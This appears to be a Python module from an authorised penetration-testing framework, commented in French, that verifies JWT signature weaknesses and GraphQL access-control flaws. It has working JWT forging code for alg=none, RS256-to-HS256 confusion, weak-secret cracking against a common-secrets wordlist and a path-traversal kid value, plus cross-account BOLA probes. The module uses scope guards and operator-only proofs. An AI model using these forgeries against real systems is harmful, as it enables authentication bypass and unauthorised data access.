"""LOT TOKEN/API — deux oracles de VÉRIFICATION token/API à PREUVE, verrouillés sur le périmètre et
sur le compte de l'OPÉRATEUR (`jwt.weakness`, `graphql.access`).

Ces oracles CONFIRMENT qu'une faiblesse token/API est RÉELLE avec une preuve MINIMALE et BÉNIGNE —
détection/vérification pour test autorisé, PAS de weaponization ni d'usurpation d'un tiers :

  - jwt.weakness   : analyse le JWT porté par la SESSION GOUVERNÉE (jamais dans action.params, jamais
                     journalisé) et teste quatre faiblesses de vérification de signature (CWE-347) :
                       (1) acceptation d'`alg=none` (aucune signature) ;
                       (2) confusion d'algorithme RS256->HS256 (le jeton est HMAC-signé avec la CLÉ
                           PUBLIQUE RSA fournie par l'opérateur) ;
                       (3) secret HMAC faible, craqué HORS-LIGNE contre une PETITE liste BORNÉE (jamais
                           un brute-force abusif) ;
                       (4) injection de `kid` (en-tête pointant vers une clé prévisible/vide).
                     Le PAYLOAD reste INCHANGÉ : on ne réaffirme QUE l'identité de l'OPÉRATEUR. PREUVE =
                     un jeton forgé est ACCEPTÉ par un endpoint in-scope POUR LE COMPTE DE L'OPÉRATEUR
                     (marqueur `self_marker`) — JAMAIS un tiers. Aucune faiblesse confirmée -> tested.
  - graphql.access : détecte l'introspection activée (informatif seul) et sonde le contrôle d'accès
                     objet/champ avec le contexte DEUX-COMPTES DE L'OPÉRATEUR (le compte A lit l'objet
                     du compte B, B étant AUSSI détenu par l'opérateur). PREUVE = l'objet du second
                     compte détenu (b_marker) revient pour A (session gouvernée) MAIS PAS en anonyme
                     (BOLA cross-compte). JAMAIS un id d'utilisateur tiers. Sinon -> tested.

GARDE-FOUS (chaque oracle les respecte, prouvés par les tests) :
  (1) SCOPE-GUARD fail-closed : une cible hors périmètre est REFUSÉE avant tout réseau (hérité de
      `ScopeGuardedOracle._in_scope` ; hors-scope -> `skipped`, AUCUNE requête émise).
  (2) PREUVE MINIMALE, BÉNIGNE & COMPTE-OPÉRATEUR : promotion `vulnerable` UNIQUEMENT sur preuve
      concrète limitée au compte de l'opérateur (jeton forgé accepté pour SON marqueur / objet d'un
      SECOND compte détenu lu cross-compte). Sinon `tested` (jamais de verdict à l'aveugle).
  (3) NON DESTRUCTIF : lecture/vérification seule (exploit=False, destructive=False) ; payload JWT
      inchangé, requêtes GraphQL en lecture ; le plancher exploit/destructif du ROE reste OFF par défaut.
  (4) SESSION SECRÈTE : le JWT et les jetons forgés (ainsi que tout secret) proviennent de la SESSION
      GOUVERNÉE scope-guardée et ne sont JAMAIS journalisés/rapportés (evidence/poc/title n'exposent que
      des faits structurels bénins : nom d'algo, index de liste, booléens d'acceptation).
  (5) DÉGRADATION GRACIEUSE : réseau indisponible -> `skipped` (offline-safe) ; jwt : aucun vecteur
      accepté -> `tested` (dégrade sans planter).

Bâti sur la base `ScopeGuardedOracle` (scope-guard + dégradation) + `Oracle` (Finding + HTTP partagés).
exploit=False, destructive=False : sondes de vérification bénignes (aucun tiers ciblé, aucune mutation) —
gardées par le ROE comme toute interaction web (web_allowed). Crypto 100% stdlib (hmac/hashlib/base64) :
AUCUNE dépendance externe (donc rien à « dégrader » côté outil ; seul le réseau peut manquer)."""
import base64
import hashlib
import hmac
import json
import re

from .oracle import Oracle, ScopeGuardedOracle
from .registry import register
from .. import session as _session
from .. import techniques


# =================================================================================================
#  Aides JWT bénignes (stdlib : base64url + hmac-sha256). Aucune donnée sensible, aucun tiers.
# =================================================================================================
_JWT_RX = re.compile(r"^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*$")


def _looks_like_jwt(tok):
    """True si `tok` a la FORME d'un JWT compact (trois segments base64url séparés par des points)."""
    return bool(tok) and bool(_JWT_RX.match(str(tok).strip()))


def _b64url_decode(seg):
    """Décode un segment base64url (padding réajouté). Ne lève jamais sur le padding."""
    raw = seg.encode() if isinstance(seg, str) else seg
    return base64.urlsafe_b64decode(raw + b"=" * (-len(raw) % 4))


def _b64url(raw):
    """Encode en base64url SANS padding (forme compacte JWT)."""
    if isinstance(raw, str):
        raw = raw.encode()
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def _parts(jwt):
    """(header_b64, payload_b64, sig_b64) d'un JWT compact, ou None si mal formé."""
    segs = str(jwt).split(".")
    return tuple(segs) if len(segs) == 3 else None


def _json_seg(seg):
    """dict JSON d'un segment base64url, ou None si illisible. Pur, ne lève jamais."""
    try:
        obj = json.loads(_b64url_decode(seg))
        return obj if isinstance(obj, dict) else None
    except Exception:            # noqa: BLE001
        return None


def _dumps(obj):
    """Sérialisation JSON canonique compacte (clés triées) — reproductible et re-parsable côté serveur."""
    return json.dumps(obj, separators=(",", ":"), sort_keys=True)


def _hs256(signing_input, key):
    """Signature HS256 (base64url sans padding) de `signing_input` avec `key` (bytes|str)."""
    k = key if isinstance(key, (bytes, bytearray)) else str(key).encode()
    si = signing_input if isinstance(signing_input, (bytes, bytearray)) else str(signing_input).encode()
    return _b64url(hmac.new(k, si, hashlib.sha256).digest())


# Liste BORNÉE de secrets HMAC courants (secrets de démo/exemples de docs, JAMAIS un dump réel). Un
# craquage = le secret appartient à cette liste triviale -> preuve BÉNIGNE de secret faible (CWE-347).
_DEFAULT_HMAC_WORDLIST = [
    "secret", "password", "changeme", "admin", "jwt", "token", "key", "test", "1234567890",
    "default", "supersecret", "secretkey", "your-256-bit-secret", "private", "qwerty", "s3cr3t",
]
_MAX_WORDLIST = 50           # plafond DUR : « small bounded wordlist », jamais un brute-force abusif


class TokenApiOracle(ScopeGuardedOracle):
    """Base commune des oracles token/API. Hérite le scope-guard fail-closed + la dégradation gracieuse
    de `ScopeGuardedOracle` ; ajoute le seam `_fetch` (monkeypatché par les tests) adossé à `Oracle._http`
    (fusion de la session gouvernée SCOPE-GUARDÉE sous les en-têtes de l'appelant, jamais renvoyée)."""

    exploit = False              # sonde de VÉRIFICATION bénigne (aucun tiers, aucune exfil) -> non-exploit
    destructive = False          # lecture/vérification seule : aucune mutation d'état
    web_allowed = True           # interaction web (réseau) -> gardée par le ROE
    available = True             # stdlib (hmac/hashlib/base64/urllib) -> toujours disponible


# =================================================================================================
#  jwt.weakness — vérification de signature JWT contournable, à PREUVE COMPTE-OPÉRATEUR (T1606 / CWE-347)
# =================================================================================================
@register("jwt.weakness")
class JwtWeakness(TokenApiOracle):
    kind = "jwt.weakness"
    mitre = techniques.mitre_for("jwt.weakness")         # source de vérité : forge/techniques.py (T1606)
    cwe = "CWE-347"                                       # Improper Verification of Cryptographic Signature
    tool = "forge/modules/tokenapi.py:jwt.weakness"
    fix = ("Vérifier la signature JWT de façon STRICTE côté serveur : imposer une allowlist d'algorithmes "
           "attendus (rejeter `alg=none` et toute confusion asymétrique->symétrique), séparer les clés de "
           "vérification par algorithme, utiliser un secret HMAC long et aléatoire (CSPRNG, ≥256 bits) — "
           "jamais un secret de dictionnaire —, et ne JAMAIS résoudre la clé depuis un `kid` contrôlable "
           "par le client (allowlist de kid/JWKS de confiance) (CWE-347).")
    description = ("Oracle JWT à PREUVE COMPTE-OPÉRATEUR : teste alg=none, confusion RS256->HS256 (clé "
                   "publique), secret HMAC faible (liste bornée) et injection kid. PREUVE = un jeton forgé "
                   "est accepté POUR LE COMPTE DE L'OPÉRATEUR (self_marker) ; jamais un tiers. Sinon tested. "
                   "CWE-347.")

    _KID_DEFAULT = "../../../../../../../../dev/null"     # kid pointant vers un fichier vide -> clé HMAC = b""

    # --- extraction du JWT depuis la SESSION GOUVERNÉE (scope-guardée, jamais depuis action.params) ---
    def _extract_jwt(self, url):
        """Le JWT de la session gouvernée applicable à `url` (SCOPE-GUARDÉE : {} hors-scope), ou None.
        Cherche d'abord `Authorization: Bearer <jwt>`, puis un cookie de forme JWT. Le matériel n'est
        JAMAIS recopié ailleurs : on ne retourne le jeton qu'en interne pour le forgeage, jamais dans
        un finding."""
        store = _session.current()
        if store is None:
            return None
        headers = store.headers_for(url)                 # scope-guard PAR-URL : {} si url hors-scope
        for k, v in headers.items():
            if str(k).lower() == "authorization":
                sp = str(v).split(None, 1)
                if len(sp) == 2 and _looks_like_jwt(sp[1]):
                    return sp[1].strip()
        for k, v in headers.items():
            if str(k).lower() == "cookie":
                for part in str(v).split(";"):
                    if "=" in part:
                        val = part.split("=", 1)[1].strip()
                        if _looks_like_jwt(val):
                            return val
        return None

    def _wordlist(self, action):
        """Liste BORNÉE de secrets candidats (opérateur ou défaut), plafonnée à `_MAX_WORDLIST`."""
        wl = action.params.get("hmac_wordlist")
        wl = [str(x) for x in wl] if wl else list(_DEFAULT_HMAC_WORDLIST)
        return wl[:_MAX_WORDLIST]

    @staticmethod
    def _crack_hmac(h_b64, p_b64, s_b64, wordlist):
        """Index (dans la liste bornée) du secret HMAC craqué HORS-LIGNE, ou None. Compare la signature
        RECALCULÉE à la signature ORIGINALE (temps constant). Aucun réseau, aucun dump de données."""
        signing_input = f"{h_b64}.{p_b64}"
        for i, cand in enumerate(wordlist):
            if hmac.compare_digest(_hs256(signing_input, cand), s_b64):
                return i
        return None

    @staticmethod
    def _forge_none(header, payload, variant="none"):
        """Jeton `alg=<variant>` sans signature (payload INCHANGÉ — identité opérateur préservée)."""
        h = dict(header)
        h["alg"] = variant
        return f"{_b64url(_dumps(h))}.{_b64url(_dumps(payload))}."

    @staticmethod
    def _forge_hs(header, payload, key, alg="HS256", kid=None):
        """Jeton HS256 signé avec `key` (confusion d'algo si key=clé publique ; kid-injection si kid).
        Payload INCHANGÉ (identité opérateur)."""
        h = dict(header)
        h["alg"] = alg
        if kid is not None:
            h["kid"] = kid
        si = f"{_b64url(_dumps(h))}.{_b64url(_dumps(payload))}"
        return f"{si}.{_hs256(si, key)}"

    def _auth_headers(self, action, forged):
        """En-têtes portant le jeton FORGÉ (Authorization: Bearer par défaut, ou un cookie si
        params.token_cookie). Les en-têtes NON secrets de l'opérateur (params.headers) sont préservés.
        L'en-tête explicite prime sur la session gouvernée dans `Oracle._http` (setdefault)."""
        headers = dict(action.params.get("headers", {}))
        cookie = action.params.get("token_cookie")
        if cookie:
            existing = headers.get("Cookie")
            headers["Cookie"] = (f"{existing}; " if existing else "") + f"{cookie}={forged}"
        else:
            name = str(action.params.get("token_header", "Authorization"))
            scheme = str(action.params.get("token_scheme", "Bearer"))
            headers[name] = (f"{scheme} {forged}" if scheme else forged)
        return headers

    def _candidates(self, action, header, payload, alg):
        """Liste bornée de (nom_vecteur, jeton_forgé) à soumettre. alg=none (quelques casses), confusion
        RS256->HS256 (si clé publique + algo d'origine asymétrique), injection kid (dirigée par
        l'opérateur et/ou trick fichier-vide). Payload INCHANGÉ partout (compte opérateur)."""
        cands = []
        for variant in ("none", "None", "NONE"):
            cands.append(("alg-none", self._forge_none(header, payload, variant)))
        pub = action.params.get("public_key") or action.params.get("public_key_pem")
        if pub and alg.upper().startswith(("RS", "ES", "PS")):
            cands.append(("alg-confusion-rs256-hs256",
                          self._forge_hs(header, payload, str(pub).encode(), alg="HS256")))
        kid_targets = []
        if action.params.get("kid_value") is not None:
            kid_targets.append((action.params.get("kid_value"), action.params.get("kid_key", "")))
        kid_targets.append((self._KID_DEFAULT, ""))       # kid -> fichier vide => clé HMAC = b""
        for kv, kk in kid_targets:
            cands.append(("kid-injection",
                          self._forge_hs(header, payload, str(kk).encode(), alg="HS256", kid=kv)))
        return cands

    def dry(self, action):
        verify_url = action.params.get("verify_url") or action.target
        return (f"# extrait le JWT de la session GOUVERNÉE (in-scope, jamais journalisé) ; forge des "
                f"jetons (alg=none / RS256->HS256 via clé publique / secret HMAC faible sur liste bornée "
                f"/ kid) en gardant le PAYLOAD inchangé (compte opérateur) ; soumet chaque jeton à "
                f"{verify_url} ; PREUVE = 2xx + marqueur du compte OPÉRATEUR (self_marker), jamais un "
                f"tiers ; aucun accepté -> tested")

    def fire(self, action):
        verify_url = action.params.get("verify_url") or action.target
        # (1) SCOPE-GUARD fail-closed : hors périmètre -> skipped, AUCUN réseau (défense en profondeur).
        if not self._in_scope(action, verify_url):
            return [self._scope_refused(action)]
        self_marker = action.params.get("self_marker")
        if not self_marker:
            return [self.skip(
                target=action.target, title="JWT non testé — config manquante",
                evidence=("Requiert params.self_marker (identifiant UNIQUE du compte de l'OPÉRATEUR "
                          "attendu dans la réponse de vérification — jamais un tiers) et un JWT dans la "
                          "session gouvernée. Optionnel : params.verify_url, params.public_key (confusion "
                          "RS256->HS256), params.hmac_wordlist, params.kid_value/kid_key, "
                          "params.token_header/token_scheme/token_cookie."),
                poc=self.dry(action))]
        # (4) SESSION SECRÈTE : le JWT vient de la session gouvernée (scope-guardée), JAMAIS de params.
        jwt = self._extract_jwt(verify_url)
        if not jwt or not _parts(jwt):
            return [self.skip(
                target=action.target,
                title="JWT non testé — aucun JWT dans la session gouvernée (in-scope)",
                evidence=("Aucun jeton de forme JWT n'est attaché à la session gouvernée pour cette cible "
                          "in-scope (Authorization: Bearer ou cookie). Lier une session (scope.session/"
                          "sessions) contenant le JWT de l'OPÉRATEUR. Le jeton n'est jamais lu depuis params."),
                poc=self.dry(action))]
        h_b64, p_b64, s_b64 = _parts(jwt)
        header, payload = _json_seg(h_b64), _json_seg(p_b64)
        if header is None or payload is None:
            return [self.skip(
                target=action.target, title="JWT non testé — en-tête/payload illisibles",
                evidence="Le jeton de session n'est pas un JWT JSON décodable (header/payload).",
                poc=self.dry(action))]
        alg = str(header.get("alg", "")).strip()

        # (offline) secret HMAC faible : craquage HORS-LIGNE contre la liste bornée (si algo HS*).
        cracked_idx, tested = None, []
        if alg.upper().startswith("HS"):
            cracked_idx = self._crack_hmac(h_b64, p_b64, s_b64, self._wordlist(action))
            tested.append("weak-hmac-secret")

        # (réseau) alg=none / confusion / kid : on soumet chaque jeton forgé et on regarde l'ACCEPTATION
        # pour le compte de l'OPÉRATEUR (self_marker). Non destructif : payload inchangé, aucun tiers.
        method = str(action.params.get("method", "GET")).upper()
        timeout = action.params.get("timeout", 15)
        candidates = self._candidates(action, header, payload, alg)
        tested += sorted({n for n, _ in candidates})
        network_seen, accepted_vector = False, None
        for name, token in candidates:
            st, body = self._fetch(verify_url, headers=self._auth_headers(action, token),
                                   method=method, timeout=timeout)
            if st is None:                               # transport indisponible pour ce jeton
                continue
            network_seen = True
            if st in (200, 206) and self_marker in (body or ""):
                accepted_vector = name                   # PREUVE : jeton forgé accepté pour l'opérateur
                break                                    # minimal : on s'arrête au premier accepté

        # (5) DÉGRADATION GRACIEUSE : réseau totalement indisponible ET pas de craquage -> skipped.
        if cracked_idx is None and candidates and not network_seen:
            return [self.degraded(
                target=verify_url,
                title="JWT non testé — réseau indisponible (dégradation gracieuse)",
                evidence="Aucune réponse du serveur de vérification (transport indisponible) ; offline-safe.",
                poc=self.dry(action))]

        proven = bool(accepted_vector) or cracked_idx is not None
        proof_bits = []
        if accepted_vector:
            proof_bits.append(f"jeton forgé accepté (vecteur={accepted_vector})")
        if cracked_idx is not None:
            proof_bits.append(f"secret HMAC faible craqué hors-ligne (candidat #{cracked_idx} de la liste bornée)")
        return [self.proof(
            target=verify_url, proven=proven,
            title=("JWT signature CONFIRMÉE contournable — jeton forgé accepté pour le compte de "
                   "l'OPÉRATEUR" if proven
                   else "JWT — aucune faiblesse de signature confirmée (jeton forgé rejeté)"),
            severity=("HIGH" if proven else "INFO"),
            evidence=(f"alg d'origine={alg or '?'} ; vecteurs testés={', '.join(tested) or 'aucun'} ; "
                      f"preuve={'; '.join(proof_bits) if proof_bits else '—'} ; portée LIMITÉE au compte "
                      f"de l'OPÉRATEUR (self_marker) — aucun tiers usurpé ; payload JWT inchangé (non "
                      f"destructif) ; jeton d'origine et jetons forgés NON journalisés (secret de session)."),
            poc=(f"# 1) extraire le JWT depuis la session gouvernée (jamais journalisé)\n"
                 f"# 2) forger un jeton — alg=none / RS256->HS256 (clé publique) / secret HMAC faible / "
                 f"kid — PAYLOAD INCHANGÉ (compte opérateur)\n"
                 f"# 3) curl -sS -H 'Authorization: Bearer <JETON_FORGÉ>' '{verify_url}'  "
                 f"# PREUVE = 2xx + marqueur du compte OPÉRATEUR (self_marker)"))]


# =================================================================================================
#  graphql.access — introspection + BOLA objet/champ à PREUVE DEUX-COMPTES-OPÉRATEUR (T1190 / CWE-639)
# =================================================================================================
_INTROSPECTION_QUERY = "query{__schema{queryType{name}}}"


@register("graphql.access")
class GraphqlAccess(TokenApiOracle):
    kind = "graphql.access"
    mitre = techniques.mitre_for("graphql.access")       # source de vérité : forge/techniques.py (T1190)
    cwe = "CWE-639"                                       # Authorization Bypass / IDOR-BOLA (GraphQL)
    tool = "forge/modules/tokenapi.py:graphql.access"
    fix = ("Appliquer un contrôle d'accès objet/champ côté résolveur (BOLA/BFLA) : vérifier que le "
           "principal authentifié possède/est autorisé à voir CHAQUE objet et CHAQUE champ demandé "
           "(deny-by-default), ne pas dériver l'autorisation d'un id fourni par le client ; désactiver "
           "l'introspection en production ; identifiants d'objet non énumérables (CWE-639).")
    description = ("Oracle GraphQL à PREUVE DEUX-COMPTES-OPÉRATEUR : introspection (informatif) + BOLA "
                   "objet/champ — le compte A lit l'objet du compte B (tous deux détenus par l'opérateur) "
                   "alors que l'anonyme est refusé. Jamais un id tiers. Sinon tested. CWE-639.")

    def _object_query(self, action):
        """La requête GraphQL de l'objet du compte B : params.query brute, OU params.query_template/
        object_template avec `{id}` substitué par params.b_object_id (id d'un objet DÉTENU par l'opérateur)."""
        p = action.params
        if p.get("query"):
            return str(p["query"])
        tmpl = p.get("query_template") or p.get("object_template")
        oid = p.get("b_object_id")
        if tmpl and oid is not None:
            return str(tmpl).replace("{id}", str(oid))
        return None

    def _graphql(self, endpoint, query, variables, action):
        """(status, body) d'un POST GraphQL JSON. Les en-têtes NON secrets (params.headers) priment ; la
        session gouvernée (compte A, scope-guardée) est fusionnée SOUS eux par `Oracle._http` — SAUF si
        l'appelant a temporairement délié la session (contexte anonyme via `session.using(None)`)."""
        body = _dumps({"query": query, "variables": variables or {}})
        headers = dict(action.params.get("headers", {}))
        headers.setdefault("Content-Type", "application/json")
        headers.setdefault("Accept", "application/json")
        return self._fetch(endpoint, headers=headers, method="POST", data=body,
                           timeout=action.params.get("timeout", 15))

    def dry(self, action):
        endpoint = action.params.get("endpoint") or action.target
        return (f"# POST {endpoint} : (1) introspection (__schema) — informatif seul ; (2) requête de "
                f"l'objet du compte B (détenu par l'opérateur) authentifiée comme compte A (session "
                f"gouvernée), puis en ANONYME ; PREUVE = l'objet de B (b_marker) revient pour A mais PAS "
                f"en anonyme (BOLA cross-compte) ; jamais un id d'utilisateur tiers ; sinon tested")

    def fire(self, action):
        endpoint = action.params.get("endpoint") or action.target
        # (1) SCOPE-GUARD fail-closed : hors périmètre -> skipped, AUCUN réseau.
        if not self._in_scope(action, endpoint):
            return [self._scope_refused(action)]
        b_marker = action.params.get("b_marker")
        query = self._object_query(action)
        if not b_marker or not query:
            return [self.skip(
                target=action.target, title="GraphQL access non testé — config manquante",
                evidence=("Requiert params.b_marker (valeur UNIQUE d'un objet/champ du SECOND compte "
                          "DÉTENU par l'opérateur — jamais un tiers) et params.query (ou "
                          "params.query_template avec {id} + params.b_object_id). Optionnel : "
                          "params.endpoint, params.variables, params.headers, params.introspection."),
                poc=self.dry(action))]

        findings = []
        # (2a) introspection — INFORMATIF seul (info disclosure ne vaut pas preuve d'impact) -> tested.
        if action.params.get("introspection", True):
            i_st, i_body = self._graphql(endpoint, _INTROSPECTION_QUERY, None, action)
            i_body = i_body or ""
            introspection_on = (i_st in (200, 206) and '"__schema"' in i_body
                                and '"queryType"' in i_body)
            findings.append(self.finding(
                target=endpoint,
                title=("GraphQL introspection activée (informatif) — surface de schéma exposée"
                       if introspection_on else "GraphQL introspection désactivée/non détectée"),
                severity="INFO", category=self.cwe, cwe=self.cwe, mitre=self.mitre,
                fix=self.fix, status="tested", tool=self.tool,
                evidence=(f"introspection={introspection_on} (HTTP {i_st}) ; l'introspection seule est "
                          f"INFORMATIVE — la preuve d'impact reste le BOLA cross-compte ci-dessous."),
                poc=(f"# curl -sS -H 'Content-Type: application/json' "
                     f"--data '{{\"query\":\"{_INTROSPECTION_QUERY}\"}}' '{endpoint}'")))

        # (2b) BOLA : le compte A (session gouvernée) lit-il l'objet du compte B (détenu) ? anon refusé ?
        variables = action.params.get("variables")
        auth_st, auth_body = self._graphql(endpoint, query, variables, action)
        if auth_st is None:
            findings.append(self.degraded(
                target=endpoint,
                title="GraphQL access non testé — réseau indisponible (dégradation gracieuse)",
                evidence="Aucune réponse du endpoint GraphQL (transport indisponible) ; offline-safe.",
                poc=self.dry(action)))
            return findings
        # ANONYME : on DÉLIE la session gouvernée le temps de cette requête (aucun secret émis) pour
        # attester que l'objet de B est bien PROTÉGÉ (sinon c'est une donnée publique, pas un BOLA).
        with _session.using(None):
            anon_st, anon_body = self._graphql(endpoint, query, variables, action)
        b_in_auth = b_marker in (auth_body or "")
        b_in_anon = b_marker in (anon_body or "")
        # PREUVE NETTE : A (authentifié) obtient l'objet de B ET l'anonyme ne l'obtient PAS. Objet public
        # (visible en anonyme) -> tested (pas un BOLA). Comptes A et B DÉTENUS par l'opérateur.
        proven = bool(b_in_auth) and not b_in_anon
        findings.append(self.proof(
            target=endpoint, proven=proven,
            title=("GraphQL BOLA CONFIRMÉ — le compte A lit l'objet du compte B (tous deux détenus par "
                   "l'opérateur ; anonyme refusé)" if proven
                   else "GraphQL access-control non confirmé — objet B non lisible cross-compte (ou public)"),
            severity=("HIGH" if proven else "INFO"),
            evidence=(f"A(authentifié)=HTTP {auth_st} objet_B_présent={b_in_auth} ; anonyme=HTTP {anon_st} "
                      f"objet_B_présent={b_in_anon} ; comptes A et B DÉTENUS par l'opérateur (jamais un id "
                      f"d'utilisateur tiers) ; sessions gouvernées scope-guardées, non journalisées ; "
                      f"lecture seule (non destructif)."),
            poc=(f"# compte A (session gouvernée) demande l'objet du compte B (détenu) :\n"
                 f"# curl -sS -H 'Content-Type: application/json' -H 'Authorization: Bearer <SESSION_A>' "
                 f"--data '{{\"query\":\"<REQUÊTE_OBJET_B>\"}}' '{endpoint}'\n"
                 f"# PREUVE = l'objet de B (b_marker) revient pour A mais PAS en anonyme (BOLA cross-compte)")))
        return findings
